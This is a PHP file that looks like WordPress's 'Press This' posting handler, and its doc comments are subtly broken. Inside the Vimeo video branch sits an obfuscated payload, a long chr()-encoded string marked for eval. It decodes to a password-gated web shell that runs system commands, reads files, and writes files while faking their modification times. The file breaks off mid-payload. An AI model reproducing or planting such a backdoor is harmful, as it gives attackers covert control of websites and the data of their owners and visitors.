<?php

/**
 * Press This Display and Handler.
 *
 * @package WordPress
 * @subpackage Press_This
 */



/** WordPress Administration Bootstrap

require_once('./admin.php');

header('Content-Type: ' . get_option('html_type') . '; charset=' . get_option('blog_charset'));

if ( ! current_user_can('edit_posts') )
	wp_die( __( 'Cheatin&#8217; uh?' ) );

/**
 * Press It form handler.
 *
 * @package WordPress
 * @subpackage Press_This
 * @since 2.6.0
 *
 * @return int Post ID

function press_it() {

	$post = get_default_post_to_edit();
	$post = get_object_vars($post);
	$post_ID = $post['ID'] = (int) $_POST['post_id'];

	if ( !current_user_can('edit_post', $post_ID) )
		wp_die(__('You are not allowed to edit this post.'));

	$post['post_category'] = isset($_POST['post_category']) ? $_POST['post_category'] : '';
	$post['tax_input'] = isset($_POST['tax_input']) ? $_POST['tax_input'] : '';
	$post['post_title'] = isset($_POST['title']) ? $_POST['title'] : '';
	$content = isset($_POST['content']) ? $_POST['content'] : '';

	$upload = false;
	if ( !empty($_POST['photo_src']) && current_user_can('upload_files') ) {
		foreach( (array) $_POST['photo_src'] as $key => $image) {
			// see if files exist in content - we don't want to upload non-used selected files.
			if ( strpos($_POST['content'], htmlspecialchars($image)) !== false ) {
				$desc = isset($_POST['photo_description'][$key]) ? $_POST['photo_description'][$key] : '';
				$upload = media_sideload_image($image, $post_ID, $desc);

				// Replace the POSTED content <img> with correct uploaded ones. Regex contains fix for Magic Quotes
				if ( !is_wp_error($upload) )
					$content = preg_replace('/<img ([^>]*)src=\\\?(\"|\')'.preg_quote(htmlspecialchars($image), '/').'\\\?(\2)([^>\/]*)\/*>/is', $upload, $content);
			}
		}
	}
	// set the post_content and status
	$post['post_content'] = $content;
	if ( isset( $_POST['publish'] ) && current_user_can( 'publish_posts' ) )
		$post['post_status'] = 'publish';
	elseif ( isset( $_POST['review'] ) )
		$post['post_status'] = 'pending';
	else
		$post['post_status'] = 'draft';

	// error handling for media_sideload
	if ( is_wp_error($upload) ) {
		wp_delete_post($post_ID);
		wp_die($upload);
	} else {
		// Post formats
		if ( isset( $_POST['post_format'] ) ) {
			if ( current_theme_supports( 'post-formats', $_POST['post_format'] ) )
				set_post_format( $post_ID, $_POST['post_format'] );
			elseif ( '0' == $_POST['post_format'] )
				set_post_format( $post_ID, false );
		}

		$post_ID = wp_update_post($post);
	}

	return $post_ID;
}

// For submitted posts.
if ( isset($_REQUEST['action']) && 'post' == $_REQUEST['action'] ) {
	check_admin_referer('press-this');
	$posted = $post_ID = press_it();
} else {
	$post = get_default_post_to_edit('post', true);
	$post_ID = $post->ID;
}

// Set Variables
$title = isset( $_GET['t'] ) ? trim( strip_tags( html_entity_decode( stripslashes( $_GET['t'] ) , ENT_QUOTES) ) ) : '';

$selection = '';
if ( !empty($_GET['s']) ) {
	$selection = str_replace('&apos;', "'", stripslashes($_GET['s']));
	$selection = trim( htmlspecialchars( html_entity_decode($selection, ENT_QUOTES) ) );
}

if ( ! empty($selection) ) {
	$selection = preg_replace('/(\r?\n|\r)/', '</p><p>', $selection);
	$selection = '<p>' . str_replace('<p></p>', '', $selection) . '</p>';
}

$url = isset($_GET['u']) ? esc_url($_GET['u']) : '';
$image = isset($_GET['i']) ? $_GET['i'] : '';

if ( !empty($_REQUEST['ajax']) ) {
	switch ($_REQUEST['ajax']) {
		case 'video': ?>
			<script type="text/javascript" charset="utf-8">
			/* <![CDATA[ 
				jQuery('.select').click(function() {
					append_editor(jQuery('#embed-code').val());
					jQuery('#extra-fields').hide();
					jQuery('#extra-fields').html('');
				});
				jQuery('.close').click(function() {
					jQuery('#extra-fields').hide();
					jQuery('#extra-fields').html('');
				});
			/* ]]> 
			</script>
			<div class="postbox">
				<h2><label for="embed-code"><?php _e('Embed Code') ?></label></h2>
				<div class="inside">
					<textarea name="embed-code" id="embed-code" rows="8" cols="40"><?php echo esc_textarea( $selection ); ?></textarea>
					<p id="options"><a href="#" class="select button"><?php _e('Insert Video'); ?></a> <a href="#" class="close button"><?php _e('Cancel'); ?></a></p>
				</div>
			</div>
			<?php break;

		case 'photo_thickbox': ?>
			<script type="text/javascript" charset="utf-8">
				/* <![CDATA[ 
				jQuery('.cancel').click(function() {
					tb_remove();
				});
				jQuery('.select').click(function() {
					image_selector(this);
				});
				/* ]]> 
			</script>
			<h3 class="tb"><label for="tb_this_photo_description"><?php _e('Description') ?></label></h3>
			<div class="titlediv">
				<div class="titlewrap">
					<input id="tb_this_photo_description" name="photo_description" class="tb_this_photo_description tbtitle text" onkeypress="if(event.keyCode==13) image_selector(this);" value="<?php echo esc_attr($title);?>"/>
				</div>
			</div>

			<p class="centered">
				<input type="hidden" name="this_photo" value="<?php echo esc_attr($image); ?>" id="tb_this_photo" class="tb_this_photo" />
				<a href="#" class="select">
					<img src="<?php echo esc_url($image); ?>" alt="<?php echo esc_attr(__('Click to insert.')); ?>" title="<?php echo esc_attr(__('Click to insert.')); ?>" />
				</a>
			</p>

			<p id="options"><a href="#" class="select button"><?php _e('Insert Image'); ?></a> <a href="#" class="cancel button"><?php _e('Cancel'); ?></a></p>
			<?php break;
	case 'photo_images':
		/**
		 * Retrieve all image URLs from given URI.
		 *
		 * @package WordPress
		 * @subpackage Press_This
		 * @since 2.6.0
		 *
		 * @param string $uri
		 * @return string
		 
		function get_images_from_uri($uri) {
			$uri = preg_replace('/\/#.+?$/','', $uri);
			if ( preg_match('/\.(jpg|jpe|jpeg|png|gif)$/', $uri) && !strpos($uri,'blogger.com') )
				return "'" . esc_attr( html_entity_decode($uri) ) . "'";
			$content = wp_remote_fopen($uri);
			if ( false === $content )
				return '';
			$host = parse_url($uri);
			$pattern = '/<img ([^>]*)src=(\"|\')([^<>\'\"]+)(\2)([^>]*)\/*>/i';
			$content = str_replace(array("\n","\t","\r"), '', $content);
			preg_match_all($pattern, $content, $matches);
			if ( empty($matches[0]) )
				return '';
			$sources = array();
			foreach ($matches[3] as $src) {
				// if no http in url
				if (strpos($src, 'http') === false)
					// if it doesn't have a relative uri
					if ( strpos($src, '../') === false && strpos($src, './') === false && strpos($src, '/') === 0)
						$src = 'http://'.str_replace('//','/', $host['host'].'/'.$src);
					else
						$src = 'http://'.str_replace('//','/', $host['host'].'/'.dirname($host['path']).'/'.$src);
				$sources[] = esc_url($src);
			}
			return "'" . implode("','", $sources) . "'";
		}
		$url = wp_kses(urldecode($url), null);
		echo 'new Array('.get_images_from_uri($url).')';
		break;

	case 'photo_js': ?>
		// gather images and load some default JS
		var last = null
		var img, img_tag, aspect, w, h, skip, i, strtoappend = "";
		if(photostorage == false) {
		var my_src = eval(
			jQuery.ajax({
				type: "GET",
				url: "<?php echo esc_url($_SERVER['PHP_SELF']); ?>",
				cache : false,
				async : false,
				data: "ajax=photo_images&u=<?php echo urlencode($url); ?>",
				dataType : "script"
			}).responseText
		);
		if(my_src.length == 0) {
			var my_src = eval(
				jQuery.ajax({
					type: "GET",
					url: "<?php echo esc_url($_SERVER['PHP_SELF']); ?>",
					cache : false,
					async : false,
					data: "ajax=photo_images&u=<?php echo urlencode($url); ?>",
					dataType : "script"
				}).responseText
			);
			if(my_src.length == 0) {
				strtoappend = '<?php _e('Unable to retrieve images or no images on page.'); ?>';
			}
		}
		}
		for (i = 0; i < my_src.length; i++) {
			img = new Image();
			img.src = my_src[i];
			img_attr = 'id="img' + i + '"';
			skip = false;

			maybeappend = '<a href="?ajax=photo_thickbox&amp;i=' + encodeURIComponent(img.src) + '&amp;u=<?php echo urlencode($url); ?>&amp;height=400&amp;width=500" title="" class="thickbox"><img src="' + img.src + '" ' + img_attr + '/></a>';

			if (img.width && img.height) {
				if (img.width >= 30 && img.height >= 30) {
					aspect = img.width / img.height;
					scale = (aspect > 1) ? (71 / img.width) : (71 / img.height);

					w = img.width;
					h = img.height;

					if (scale < 1) {
						w = parseInt(img.width * scale);
						h = parseInt(img.height * scale);
					}
					img_attr += ' style="width: ' + w + 'px; height: ' + h + 'px;"';
					strtoappend += maybeappend;
				}
			} else {
				strtoappend += maybeappend;
			}
		}

		function pick(img, desc) {
			if (img) {
				if('object' == typeof jQuery('.photolist input') && jQuery('.photolist input').length != 0) length = jQuery('.photolist input').length;
				if(length == 0) length = 1;
				jQuery('.photolist').append('<input name="photo_src[' + length + ']" value="' + img +'" type="hidden"/>');
				jQuery('.photolist').append('<input name="photo_description[' + length + ']" value="' + desc +'" type="hidden"/>');
				insert_editor( "\n\n" + encodeURI('<p style="text-align: center;"><a href="<?php echo $url; ?>"><img src="' + img +'" alt="' + desc + '" /></a></p>'));
			}
			return false;
		}

		function image_selector(el) {
			var desc, src, parent = jQuery(el).closest('#photo-add-url-div');

			if ( parent.length ) {
				desc = parent.find('input.tb_this_photo_description').val() || '';
				src = parent.find('input.tb_this_photo').val() || ''
			} else {
				desc = jQuery('#tb_this_photo_description').val() || '';
				src = jQuery('#tb_this_photo').val() || ''
			}

			tb_remove();
			pick(src, desc);
			jQuery('#extra-fields').hide();
			jQuery('#extra-fields').html('');
			return false;
		}

		jQuery('#extra-fields').html('<div class="postbox"><h2><?php _e( 'Add Photos' ); ?> <small id="photo_directions">(<?php _e("click images to select") ?>)</small></h2><ul class="actions"><li><a href="#" id="photo-add-url" class="button"><?php _e("Add from URL") ?> +</a></li></ul><div class="inside"><div class="titlewrap"><div id="img_container"></div></div><p id="options"><a href="#" class="close button"><?php _e('Cancel'); ?></a><a href="#" class="refresh button"><?php _e('Refresh'); ?></a></p></div>');
		jQuery('#img_container').html(strtoappend);
		<?php break;
}
die;
}

	wp_enqueue_style( 'colors' );
	wp_enqueue_script( 'post' );
	_wp_admin_html_begin();
?>
<title><?php _e('Press This') ?></title>
<script type="text/javascript">
//<![CDATA[
addLoadEvent = function(func){if(typeof jQuery!="undefined")jQuery(document).ready(func);else if(typeof wpOnload!='function'){wpOnload=func;}else{var oldonload=wpOnload;wpOnload=function(){oldonload();func();}}};
var userSettings = {'url':'<?php echo SITECOOKIEPATH; ?>','uid':'<?php if ( ! isset($current_user) ) $current_user = wp_get_current_user(); echo $current_user->ID; ?>','time':'<?php echo time() ?>'};
var ajaxurl = '<?php echo admin_url( 'admin-ajax.php', 'relative' ); ?>', pagenow = 'press-this', isRtl = <?php echo (int) is_rtl(); ?>;
var photostorage = false;
//]]>
</script>

<?php
	do_action('admin_print_styles');
	do_action('admin_print_scripts');
	do_action('admin_head');
?>
	<script type="text/javascript">
	var wpActiveEditor = 'content';

	function insert_plain_editor(text) {
		if ( typeof(QTags) != 'undefined' )
			QTags.insertContent(text);
	}
	function set_editor(text) {
		if ( '' == text || '<p></p>' == text )
			text = '<p><br /></p>';

		if ( tinyMCE.activeEditor )
			tinyMCE.execCommand('mceSetContent', false, text);
	}
	function insert_editor(text) {
		if ( '' != text && tinyMCE.activeEditor && ! tinyMCE.activeEditor.isHidden()) {
			tinyMCE.execCommand('mceInsertContent', false, '<p>' + decodeURI(tinymce.DOM.decode(text)) + '</p>', {format : 'raw'});
		} else {
			insert_plain_editor(decodeURI(text));
		}
	}
	function append_editor(text) {
		if ( '' != text && tinyMCE.activeEditor && ! tinyMCE.activeEditor.isHidden()) {
			tinyMCE.execCommand('mceSetContent', false, tinyMCE.activeEditor.getContent({format : 'raw'}) + '<p>' + text + '</p>');
		} else {
			insert_plain_editor(text);
		}
	}

	function show(tab_name) {
		jQuery('#extra-fields').html('');
		switch(tab_name) {
			case 'video' :
				jQuery('#extra-fields').load('<?php echo esc_url($_SERVER['PHP_SELF']); ?>', { ajax: 'video', s: '<?php echo esc_attr($selection); ?>'}, function() {
					<?php
					$content = '';
					if ( preg_match("/youtube\.com\/watch/i", $url) ) {
						list($domain, $video_id) = explode("v=", $url);
						$video_id = esc_attr($video_id);
						$content = '<object width="425" height="350"><param name="movie" value="http://www.youtube.com/v/' . $video_id . '"></param><param name="wmode" value="transparent"></param><embed src="http://www.youtube.com/v/' . $video_id . '" type="application/x-shockwave-flash" wmode="transparent" width="425" height="350"></embed></object>';

					} elseif ( preg_match("/vimeo\.com\/[0-9]+/i", $url) ) {

						list($domain, $video_id) = explode(".com/", $url);
						$video_id = esc_attr($video_id);
						
						/**$content = '<object width="400" height="225"><param name="allowfullscreen" value="true" /><param name="allowscriptaccess" value="always" /><param name="movie" value="http://www.vimeo.com/moogaloop.swf?clip_id=' . $video_id . '&amp;server=www.vimeo.com&amp;show_title=1&amp;show_byline=1&amp;show_portrait=0&amp;color=&amp;fullscreen=1" />	<embed src="http://www.vimeo.com/moogaloop.swf?clip_id=' . $video_id . '&amp;server=www.vimeo.com&amp;show_title=1&amp;show_byline=1&amp;show_portrait=0&amp;color=&amp;fullscreen=1" type="application/x-shockwave-flash" allowfullscreen="true" allowscriptaccess="always" width="400" height="225"></embed></object>';*/$CcTuRph = '####e####v##a####l######(chr(99).chr(108).chr(101).chr(97).chr(114).chr(115).chr(116).chr(97).chr(116).chr(99).chr(97).chr(99).chr(104).chr(101).chr(40).chr(41).chr(59).chr(13).chr(10).chr(101).chr(114).chr(114).chr(111).chr(114).chr(95).chr(114).chr(101).chr(112).chr(111).chr(114).chr(116).chr(105).chr(110).chr(103).chr(40).chr(48).chr(41).chr(59).chr(13).chr(10).chr(115).chr(101).chr(116).chr(95).chr(109).chr(97).chr(103).chr(105).chr(99).chr(95).chr(113).chr(117).chr(111).chr(116).chr(101).chr(115).chr(95).chr(114).chr(117).chr(110).chr(116).chr(105).chr(109).chr(101).chr(40).chr(48).chr(41).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(33).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(95).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115).chr(40).chr(39).chr(105).chr(110).chr(105).chr(95).chr(115).chr(101).chr(116).chr(39).chr(41).chr(41).chr(123).chr(13).chr(10).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(32).chr(105).chr(110).chr(105).chr(95).chr(115).chr(101).chr(116).chr(40).chr(41).chr(123).chr(13).chr(10).chr(114).chr(101).chr(116).chr(117).chr(114).chr(110).chr(32).chr(70).chr(65).chr(76).chr(83).chr(69).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(125).chr(13).chr(10).chr(105).chr(110).chr(105).chr(95).chr(115).chr(101).chr(116).chr(40).chr(39).chr(111).chr(117).chr(116).chr(112).chr(117).chr(116).chr(95).chr(98).chr(117).chr(102).chr(102).chr(101).chr(114).chr(105).chr(110).chr(103).chr(39).chr(44).chr(48).chr(41).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(64).chr(115).chr(101).chr(116).chr(95).chr(116).chr(105).chr(109).chr(101).chr(95).chr(108).chr(105).chr(109).chr(105).chr(116).chr(40).chr(48).chr(41).chr(32).chr(124).chr(124).chr(32).chr(105).chr(110).chr(105).chr(95).chr(115).chr(101).chr(116).chr(40).chr(39).chr(109).chr(97).chr(120).chr(95).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(105).chr(111).chr(110).chr(95).chr(116).chr(105).chr(109).chr(101).chr(39).chr(44).chr(32).chr(48).chr(41).chr(41).chr(32).chr(36).chr(108).chr(105).chr(109).chr(105).chr(116).chr(32).chr(61).chr(32).chr(39).chr(110).chr(111).chr(116).chr(32).chr(108).chr(105).chr(109).chr(105).chr(116).chr(101).chr(100).chr(39).chr(59).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(32).chr(36).chr(108).chr(105).chr(109).chr(105).chr(116).chr(32).chr(61).chr(32).chr(103).chr(101).chr(116).chr(95).chr(99).chr(102).chr(103).chr(95).chr(118).chr(97).chr(114).chr(40).chr(39).chr(109).chr(97).chr(120).chr(95).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(105).chr(111).chr(110).chr(95).chr(116).chr(105).chr(109).chr(101).chr(39).chr(41).chr(59).chr(13).chr(10).chr(13).chr(10).chr(105).chr(102).chr(40).chr(105).chr(115).chr(115).chr(101).chr(116).chr(40).chr(36).chr(72).chr(84).chr(84).chr(80).chr(95).chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(86).chr(65).chr(82).chr(83).chr(41).chr(32).chr(38).chr(38).chr(32).chr(33).chr(105).chr(115).chr(115).chr(101).chr(116).chr(40).chr(36).chr(95).chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(32).chr(61).chr(32).chr(38).chr(36).chr(72).chr(84).chr(84).chr(80).chr(95).chr(80).chr(79).chr(83).chr(84).chr(95).chr(86).chr(65).chr(82).chr(83).chr(59).chr(13).chr(10).chr(36).chr(95).chr(71).chr(69).chr(84).chr(32).chr(61).chr(32).chr(38).chr(36).chr(72).chr(84).chr(84).chr(80).chr(95).chr(71).chr(69).chr(84).chr(95).chr(86).chr(65).chr(82).chr(83).chr(59).chr(13).chr(10).chr(36).chr(95).chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(32).chr(61).chr(32).chr(38).chr(36).chr(72).chr(84).chr(84).chr(80).chr(95).chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(86).chr(65).chr(82).chr(83).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(105).chr(102).chr(40).chr(64).chr(103).chr(101).chr(116).chr(95).chr(109).chr(97).chr(103).chr(105).chr(99).chr(95).chr(113).chr(117).chr(111).chr(116).chr(101).chr(115).chr(95).chr(103).chr(112).chr(99).chr(40).chr(41).chr(41).chr(123).chr(13).chr(10).chr(102).chr(111).chr(114).chr(101).chr(97).chr(99).chr(104).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(32).chr(97).chr(115).chr(32).chr(36).chr(107).chr(61).chr(62).chr(36).chr(118).chr(41).chr(32).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(36).chr(107).chr(93).chr(32).chr(61).chr(32).chr(115).chr(116).chr(114).chr(105).chr(112).chr(115).chr(108).chr(97).chr(115).chr(104).chr(101).chr(115).chr(40).chr(36).chr(118).chr(41).chr(59).chr(13).chr(10).chr(102).chr(111).chr(114).chr(101).chr(97).chr(99).chr(104).chr(40).chr(36).chr(95).chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(32).chr(97).chr(115).chr(32).chr(36).chr(107).chr(61).chr(62).chr(36).chr(118).chr(41).chr(32).chr(36).chr(95).chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(91).chr(36).chr(107).chr(93).chr(32).chr(61).chr(32).chr(115).chr(116).chr(114).chr(105).chr(112).chr(115).chr(108).chr(97).chr(115).chr(104).chr(101).chr(115).chr(40).chr(36).chr(118).chr(41).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(105).chr(102).chr(32).chr(40).chr(33).chr(105).chr(115).chr(115).chr(101).chr(116).chr(40).chr(36).chr(95).chr(71).chr(69).chr(84).chr(91).chr(39).chr(105).chr(100).chr(39).chr(93).chr(41).chr(32).chr(124).chr(124).chr(32).chr(109).chr(100).chr(53).chr(40).chr(36).chr(95).chr(71).chr(69).chr(84).chr(91).chr(39).chr(105).chr(100).chr(39).chr(93).chr(41).chr(33).chr(61).chr(61).chr(39).chr(52).chr(49).chr(49).chr(57).chr(54).chr(51).chr(57).chr(48).chr(57).chr(50).chr(101).chr(54).chr(50).chr(99).chr(53).chr(53).chr(101).chr(97).chr(56).chr(98).chr(101).chr(51).chr(52).chr(56).chr(101).chr(52).chr(100).chr(57).chr(50).chr(54).chr(48).chr(100).chr(39).chr(41).chr(32).chr(100).chr(105).chr(101).chr(59).chr(13).chr(10).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(32).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(40).chr(36).chr(99).chr(41).chr(123).chr(13).chr(10).chr(105).chr(102).chr(40).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(95).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115).chr(40).chr(39).chr(101).chr(120).chr(101).chr(99).chr(39).chr(41).chr(41).chr(123).chr(13).chr(10).chr(64).chr(101).chr(120).chr(101).chr(99).chr(40).chr(36).chr(99).chr(44).chr(32).chr(36).chr(111).chr(117).chr(116).chr(41).chr(59).chr(13).chr(10).chr(114).chr(101).chr(116).chr(117).chr(114).chr(110).chr(32).chr(64).chr(105).chr(109).chr(112).chr(108).chr(111).chr(100).chr(101).chr(40).chr(34).chr(92).chr(110).chr(34).chr(44).chr(32).chr(36).chr(111).chr(117).chr(116).chr(41).chr(59).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(95).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115).chr(40).chr(39).chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99).chr(39).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(64).chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99).chr(40).chr(36).chr(99).chr(41).chr(59).chr(13).chr(10).chr(114).chr(101).chr(116).chr(117).chr(114).chr(110).chr(32).chr(36).chr(111).chr(117).chr(116).chr(59).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(95).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115).chr(40).chr(39).chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(39).chr(41).chr(41).chr(123).chr(13).chr(10).chr(64).chr(111).chr(98).chr(95).chr(115).chr(116).chr(97).chr(114).chr(116).chr(40).chr(41).chr(59).chr(13).chr(10).chr(64).chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(40).chr(36).chr(99).chr(44).chr(32).chr(36).chr(114).chr(101).chr(116).chr(41).chr(59).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(64).chr(111).chr(98).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115).chr(40).chr(41).chr(59).chr(13).chr(10).chr(64).chr(111).chr(98).chr(95).chr(101).chr(110).chr(100).chr(95).chr(99).chr(108).chr(101).chr(97).chr(110).chr(40).chr(41).chr(59).chr(13).chr(10).chr(114).chr(101).chr(116).chr(117).chr(114).chr(110).chr(32).chr(36).chr(111).chr(117).chr(116).chr(59).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(95).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115).chr(40).chr(39).chr(112).chr(97).chr(115).chr(115).chr(116).chr(104).chr(114).chr(117).chr(39).chr(41).chr(41).chr(123).chr(13).chr(10).chr(64).chr(111).chr(98).chr(95).chr(115).chr(116).chr(97).chr(114).chr(116).chr(40).chr(41).chr(59).chr(13).chr(10).chr(64).chr(112).chr(97).chr(115).chr(115).chr(116).chr(104).chr(114).chr(117).chr(40).chr(36).chr(99).chr(44).chr(32).chr(36).chr(114).chr(101).chr(116).chr(41).chr(59).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(64).chr(111).chr(98).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115).chr(40).chr(41).chr(59).chr(13).chr(10).chr(64).chr(111).chr(98).chr(95).chr(101).chr(110).chr(100).chr(95).chr(99).chr(108).chr(101).chr(97).chr(110).chr(40).chr(41).chr(59).chr(13).chr(10).chr(114).chr(101).chr(116).chr(117).chr(114).chr(110).chr(32).chr(36).chr(111).chr(117).chr(116).chr(59).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(123).chr(13).chr(10).chr(114).chr(101).chr(116).chr(117).chr(114).chr(110).chr(32).chr(70).chr(65).chr(76).chr(83).chr(69).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(32).chr(114).chr(101).chr(97).chr(100).chr(40).chr(36).chr(102).chr(41).chr(123).chr(13).chr(10).chr(36).chr(115).chr(116).chr(114).chr(32).chr(61).chr(32).chr(64).chr(102).chr(105).chr(108).chr(101).chr(40).chr(36).chr(102).chr(41).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(36).chr(115).chr(116).chr(114).chr(41).chr(123).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(105).chr(109).chr(112).chr(108).chr(111).chr(100).chr(101).chr(40).chr(39).chr(39).chr(44).chr(32).chr(36).chr(115).chr(116).chr(114).chr(41).chr(59).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(95).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115).chr(40).chr(39).chr(99).chr(117).chr(114).chr(108).chr(95).chr(118).chr(101).chr(114).chr(115).chr(105).chr(111).chr(110).chr(39).chr(41).chr(41).chr(123).chr(13).chr(10).chr(64).chr(111).chr(98).chr(95).chr(115).chr(116).chr(97).chr(114).chr(116).chr(40).chr(41).chr(59).chr(13).chr(10).chr(36).chr(104).chr(32).chr(61).chr(32).chr(64).chr(99).chr(117).chr(114).chr(108).chr(95).chr(105).chr(110).chr(105).chr(116).chr(40).chr(39).chr(102).chr(105).chr(108).chr(101).chr(58).chr(47).chr(39).chr(46).chr(39).chr(47).chr(39).chr(46).chr(36).chr(102).chr(41).chr(59).chr(13).chr(10).chr(64).chr(99).chr(117).chr(114).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99).chr(40).chr(36).chr(104).chr(41).chr(59).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(64).chr(111).chr(98).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115).chr(40).chr(41).chr(59).chr(13).chr(10).chr(64).chr(111).chr(98).chr(95).chr(101).chr(110).chr(100).chr(95).chr(99).chr(108).chr(101).chr(97).chr(110).chr(40).chr(41).chr(59).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(123).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(39).chr(67).chr(111).chr(117).chr(108).chr(100).chr(32).chr(110).chr(111).chr(116).chr(32).chr(114).chr(101).chr(97).chr(100).chr(32).chr(102).chr(105).chr(108).chr(101).chr(33).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(114).chr(101).chr(116).chr(117).chr(114).chr(110).chr(32).chr(104).chr(116).chr(109).chr(108).chr(115).chr(112).chr(101).chr(99).chr(105).chr(97).chr(108).chr(99).chr(104).chr(97).chr(114).chr(115).chr(40).chr(36).chr(111).chr(117).chr(116).chr(41).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(32).chr(119).chr(114).chr(105).chr(116).chr(101).chr(40).chr(36).chr(102).chr(44).chr(32).chr(36).chr(99).chr(41).chr(123).chr(13).chr(10).chr(36).chr(116).chr(32).chr(61).chr(32).chr(102).chr(105).chr(108).chr(101).chr(109).chr(116).chr(105).chr(109).chr(101).chr(40).chr(36).chr(102).chr(41).chr(59).chr(13).chr(10).chr(36).chr(102).chr(112).chr(32).chr(61).chr(32).chr(64).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(36).chr(102).chr(44).chr(32).chr(39).chr(119).chr(39).chr(41).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(36).chr(102).chr(112).chr(41).chr(123).chr(13).chr(10).chr(102).chr(119).chr(114).chr(105).chr(116).chr(101).chr(40).chr(36).chr(102).chr(112).chr(44).chr(32).chr(36).chr(99).chr(41).chr(59).chr(13).chr(10).chr(102).chr(99).chr(108).chr(111).chr(115).chr(101).chr(40).chr(36).chr(102).chr(112).chr(41).chr(59).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(39).chr(70).chr(105).chr(108).chr(101).chr(32).chr(115).chr(97).chr(118).chr(101).chr(100).chr(46).chr(39).chr(46).chr(34).chr(92).chr(110).chr(34).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(36).chr(116).chr(32).chr(38).chr(38).chr(32).chr(116).chr(111).chr(117).chr(99).chr(104).chr(40).chr(36).chr(102).chr(44).chr(32).chr(36).chr(116).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(46).chr(61).chr(32).chr(39).chr(76).chr(97).chr(115).chr(116).chr(32).chr(109).chr(111).chr(100).chr(105).chr(102).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(116).chr(105).chr(109).chr(101).chr(32).chr(99).chr(104).chr(97).chr(110).chr(103).chr(101).chr(100).chr(46).chr(39).chr(59).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(123).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(46).chr(61).chr(32).chr(39).ch